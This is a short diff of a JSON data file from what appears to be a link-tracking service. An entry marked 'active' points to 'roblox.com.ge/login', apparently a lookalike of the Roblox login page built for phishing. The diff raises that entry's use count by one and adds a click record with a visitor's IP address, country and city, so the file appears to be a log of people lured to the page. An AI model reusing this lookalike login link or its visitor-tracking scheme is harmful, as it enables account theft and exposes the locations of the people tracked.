@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1245,
+    "useCount": 1246,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10104,6 +10104,14 @@
         "city": "Maddela",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777341934666,
+        "ip": "190.120.253.62",
+        "country": "Venezuela",
+        "city": "La Guaira",
+        "flag": "🇻🇪",
+        "countryCode": "VE"
       }
     ]
   },
